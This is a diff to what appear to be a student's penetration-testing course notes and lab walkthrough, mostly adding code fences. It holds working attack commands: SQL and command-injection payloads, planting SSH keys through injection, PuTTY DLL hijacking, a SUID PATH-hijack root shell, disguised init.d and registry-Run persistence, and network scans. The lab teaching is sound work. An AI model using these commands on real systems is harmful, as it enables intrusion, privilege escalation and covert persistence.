@@ -5,37 +5,59 @@ wget -r http://192.168.
 
 
 SQL INJECTION
+```
 ' OR 1='1
+```
 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns #
 
 
 COMMAND INJECTION
+```
 /../../../../../../../../etc/passwd
+```
+```
 /../../../../../../../../etc/hosts
-
-
+```
+```
 ; whoami
+```
+```
 ; cat /etc/passwd
+```
+```
 ; ls -latr & netstat -rn
+```
+```
 || ifconfig
-
+```
 SSH KEY UPLOAD
+```
 ssh-keygen -t rsa
+```
+```
 cat ~/.ssh/id_rsa.pub
+```
+```
 mkdir /users/home/directory/.ssh
+```
+```
 echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC26azmuQ5xArCkUwA0AIzJlyEHPeiYD+XrmibTWCKijn6zCBsXa4VT1LMGPFX8Jw69uc12qMBYkSKstye44cG4JxJExk5uMEXUkqHj0zGIgyAvm0CUjFGDA1GX17qxkQaO1Fhc2i56iGJtvp5D73o9PH9dbqmHcEUUkZ0wiEj49ihFkb8TVYu4Pnb/N0AqXDWxZ0LqTF8PtCU79c3feUyzEjVsUNXHjmOS6kbLzby6bYVEefdtsu4iHFjyaE3/QEQ8vYmy+OVhBwk3y2DWs3FZhJqqF4h5UXr1CHn+0yiloVgEHRrKC/lhUHcQTiqxIz322R5gI0/1oiZpnzFnsn/AaJJeQ8H3l1dQQ16CnGTBkYkGtnbThjMfNLiNLzx6xR+FYP5262tEZlqre0L1umQpZQhmloia8GjGgFCTxXBqQd3Qd33Dhqmhydt4lH7019mNUHH9n1SyjgYKiNkfr+OW8YXs2kbyGHRzVoySnHdHPSHCp1bYaZ38kOVPzwP/Jg/x70TpQy1jxYGZxR6uuOhU59azZRjm+mp/UGOYM+f14Lf+0UxDoeHyJUe3doCm9DbpJm0G2fw5EosDa1JtvZLsYc4/I8XBXjpUIufjvlxziongl1l30KLt0eaDT+HTzYZLd6RbV+l4fwqeIjkt5EU/nCl6k8O4KMd5MH7OM2SUDQ== student@lin-ops" >> /var/www/.ssh/authorized_keys
+```
+```
 cat /users/home/directory/.ssh/authorized_keys
-
+```
 
 
 
 
 HOST DISCOVERY
+```
 for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) 2>/dev/null ;done
-
+```
 PORT SCAN
+```
 nmap -sS -Pn 8.8.8.8 -p 135-139,22,80,443,21,8080
-
+```
 
 
 
@@ -46,19 +68,23 @@ nmap -sS -Pn 8.8.8.8 -p 135-139,22,80,443,21,8080
 
 
 PORT INTERROGATION
+```
 nmap -sV 127.0.0.1 -p 22
-
+```
 
 DLL INJECTION (PUTTY)
 Uploaded through scp, ftp, nc, python simple HTTP server, or copying base64 output
 python -m SimpleHTTPServer 8000
 
+```
 base64 bad.dll > base64dll
-
+```
+```
 move base64.txt base64
-
+```
+```
 certutil -decode base64 bad.dll
-
+```
 Put the retrieved DLL in the same location as the vulnerable Putty executable and name it correctly
 copy "PATH OF MALICIOUS DLL"  "c:\users\student\exercise_2\SSPICLI.dll"
 
@@ -70,8 +96,9 @@ copy "PATH OF MALICIOUS DLL"  "c:\users\student\exercise_2\SSPICLI.dll"
 PERSISTANCE LOCATIONS [ COMMAND LINE & GUI ]
 
 REGISTRY KEYS
+```
 reg query and registry editor
-
+```
 Services
 
 REVERSE ENGINEERING
@@ -102,21 +129,24 @@ This will be a comparison between the return code of the most recent function an
 
 
 LINUX EXPLOITATION
-
+```
 sudo -l
-
+```
+```
 find / -type f -perm /6000 -ls 2>/dev/null
+```
 -- https://gtfobins.github.io/ 
 
 
 **Take note of the setuid file /bin/netstat_natpu as it stands out to the trained eye as a non-system SUID program.**
 **where an 's' replaces the 'x' in the owner's permission field**
 FOR EXAMPLE -rw*s*r-xr-x 1 root root 845088 Nov  5 17:30 /bin/netstat_natpu
-
+```
 file /bin/netstat_natpu
-
+```
+```
 strings /bin/netstat_natpu | grep -C3 netstat
-
+```
 --
 T$8L
 T$8L
@@ -130,13 +160,15 @@ xeon_phi
 Highlight to students that the command "netstat -antpu" does not have an absolute path. 
 This means that it uses the PATH environmental variable to search for the executable. 
 An attacker can manipulate the PATH variable and execute any file under her or his control.
-
+```
 printf #!/bin/sh\n/bin/bash -i\n' > netstat # create a script called netstat that executes an interactive shell.
-
+```
+```
 chmod +x netstat
-
+```
+```
 PATH=$(pwd):$PATH /bin/netstat_natpu # GET ROOT
-
+```
 id # did it work?
     uid=0(root) gid=1002(demo2) groups=1002(demo2)
 
@@ -148,36 +180,42 @@ https://gtfobins.github.io/
 
 
 WORLD WRITABLE FILES
+```
 find / -type f -perm /2 -o -type d -perm /2 2>/dev/null 
+```
 ## Search for any file or directory that is writable by the context "other"
+```
 find / -type f -writable -o -type d -writable 2>/dev/null 
+```
 ## Search for any file or directory that is writable by the current user
 
 
 SYSTEM V RUNLEVELS [ SKELETON ]
-
+```
 cp /etc/init.d/skeleton /etc/init.d/<servicename>
-
+```
 or if skeleton file doesn't exist, 
 copy an existing startup script that in the /etc/init.d directory 
 that can be easily modified to the same directory 
 with a new name that blends in and looks like a normal, typical startup script.
-
+```
 cp /etc/init.d/<oldservicename> /etc/init.d/servicename>
-
+```
+```
 chmod +x <servicename>
-
+```
 **Set the script to start when the system enters runlevels 2 through 5.**
 chkconfig --add <servicename>
 
 **create a symbolic link to the appropriate directory. Assuming the default runlevel is 3, 
 and the rc directory for runlevel 3 is /etc/rc3.d/ then run the command:**
+```
 cd /etc/rc3.d && ln -s ../init.d/servicename>
-
+```
 **Verify the creation of the service with:**
-
+```
 chkconfig --list | grep <servicename>
-
+```
 
 
 SystemD
@@ -202,12 +240,18 @@ systemctl start <servicename>.service
 
 LINUX LOGGING REWRITE TABLES [ Linux logging SystemV ]
 
-
+```
 HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+```
+```
 HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+```
+```
 HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+```
+```
 HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
-
+```
 ----------------------------------------
 DEMO: Finding Vulnerable Services
 
@@ -252,9 +296,6 @@ Get-Eventlog -List
 
 
 ----------------------
-
-
-
 
 DEMO: Finding vulnerable Scheduled Tasks
 
@@ -361,12 +402,14 @@ Results:
 # collect open HTTP info (.100,.111)
 ```
 wget -r http://192.168.28.100
-	\\"Welcome to the Donovian Government website... Under contruction"
 ```
+	\\"Welcome to the Donovian Government website... Under contruction"
+
 ```
 wget -r http://192.168.28.111
-	\\Has authors -> Articles | Names + Email + Org -> Contacts
 ```
+	\\Has authors -> Articles | Names + Email + Org -> Contacts
+
 # creating port forward		\\connected and found out it had a ftp server open
 ```
 ssh -S /tmp/jump -O forward 
@@ -508,10 +551,19 @@ ssh -S /tmp/jump -O forward -L 21120:10.100.28.40:80 a@1
   7.) Made directory and stored ssh-key on server using Command Injection
 ```
 ; mkdir /home/billybob/.ssh
-; ls -latr /home/billybob/   \\Verified ".ssh" was made
-; echo "<rsa.pub_key>" > /home/billybob/.ssh/authorized_keys
-; ls -latr /home/billybob/.ssh    \\Verified "authorized_keys" was made
 ```
+```
+; ls -latr /home/billybob/
+```
+\\Verified ".ssh" was made
+```
+; echo "<rsa.pub_key>" > /home/billybob/.ssh/authorized_keys
+```
+```
+; ls -latr /home/billybob/.ssh
+```
+ \\Verified "authorized_keys" was made
+
   8.) Create SSH Tunnel on my machine to it
     - ssh -S /tmp/jump -O forward -L 21121:10.100.28.40:4444
     
@@ -833,6 +885,8 @@ ssh -p21110 comrade@127.0.0.1
 Extract the file and also send it to our Windows machine:
 ```
 scp -P21110 comrade@127.0.0.1:/var/www/html/consulting/public_html/longTermStorage/entry.exe /home/student
+```
+```
 scp /home/student/entry.exe student@10.50.182.219:/users/student
 ```
 </details>
@@ -842,7 +896,7 @@ scp /home/student/entry.exe student@10.50.182.219:/users/student
   
 Now that we have the "entry.exe" on both our Lin_ops and Win_ops boxes, let's run the executable in our Win_ops machine.
 ```
-  C:\Users\student> entry.exe
+C:\Users\student> entry.exe
 ```
 Results:
 ```
@@ -1485,6 +1539,8 @@ From what we learned in our first problem, let's look for search for key words u
 Our question mentions key words like *inventory* and *project*. Let's search for these in their system:
 ```
 ; find / -iname *project* 2>/dev/null
+```
+```
 ; find / -iname *inventory* 2>/dev/null
 ```
 Result after searching for *inventory*:
@@ -1541,9 +1597,11 @@ Thankfully, we can do **Command Injections**.
     drwxr-xr-x 14 root     root     4096 May  4  2023 ..
     -rw-------  1 www-data www-data   67 Dec  2 18:19 .Xauthority
     drwxr-xr-x  4 root     root     4096 May  4  2023 html
-
+```
+```
 ; mkdir /var/www/.ssh
-
+```
+```
 ; echo "<ssh-keygen_from_/id_rsa.pub>" >> /var/www/.ssh/authorized_keys
 ```
 From there, we should be able to log in after creating a tunnel. Let's use our *MS* tunnel:
@@ -1587,18 +1645,20 @@ Let's double-check what the services are:
   - Port: **514** was giving issues. Let's leave it out when we scan for the ports.
 ```
 proxychains nmap -p80,3201 -sV -Pn -T5 192.168.150.253
+```
 
 PORT     STATE SERVICE VERSION
 80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
 3201/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-```
+
 Let's scan for the UDP portion of 514:
 ```
 proxychains nmap -p514 -sU -T5 -Pn 192.168.150.253
+```
 
 PORT    STATE         SERVICE VERSION
 514/udp open|filtered syslog
-```
+
 Now for the TCP/514:
 ```
 proxychains nmap -p514 -sT -T5 -Pn 192.168.150.253
@@ -1661,7 +1721,11 @@ Check the `backup.tar.gz` for anything we can use. (1) Transfer the info to our 
 Contents inside of `backup.tar.gz`
 ```
 .ssh/
+```
+```
 .ssh/id_rsa
+```
+```
 .ssh/id_rsa.pub
 ```
 If we `cat` into the *id_rsa.pub*. We see it belongs to a user name **comrade**.
@@ -1932,8 +1996,10 @@ Find the beacon being sent to the intranet host and determine how to interact wi
 Your flag will be a unique string of twenty random characters.
 ***HINT***: The message maybe encoded ==
 ***
-Our host is being pinged. Let's look into at our network using `netstat -natup`
-
+Our host is being pinged. Let's look into at our network using 
+```
+netstat -natup`
+```
 
 
 
@@ -2083,7 +2149,8 @@ xfreerdp /u:comrade /v:127.0.0.1:21131 /dynamic-resolution +clipboard  <-- Stude
 Check *services* without descriptions:
 ```
 get-wmiobject system32_services | gm
-
+```
+```
 get-wmiobject system32_services | select name, description
 ```
 The one's without a description:
